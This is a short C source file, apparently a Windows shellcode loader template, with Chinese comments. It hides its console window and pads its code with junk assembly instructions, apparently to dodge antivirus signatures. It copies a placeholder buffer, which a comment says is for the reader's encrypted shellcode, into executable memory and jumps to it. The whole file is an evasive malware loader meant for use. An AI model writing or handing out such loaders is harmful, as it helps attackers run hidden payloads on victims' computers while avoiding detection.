#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define fucku __asm{mov eax,eax}

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

int main(void) {

    typedef int(*pfunc)(void);
    unsigned char buf[] = {0x97};//放你加密过的shellcode
    fucku;
    BYTE* sc = (BYTE*)VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fucku;
    fucku;
    //memcpy(sc,buf,sizeof(buf));
    for (int i = 0; i < sizeof(buf); i++) {
        fucku;
        sc[i] = buf[i];
    }
    pfunc shellcode = (pfunc)sc;
    __asm {
        push shellcode
        ret
    }
    //HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);
    //WaitForSingleObject(lpThread,-1);
}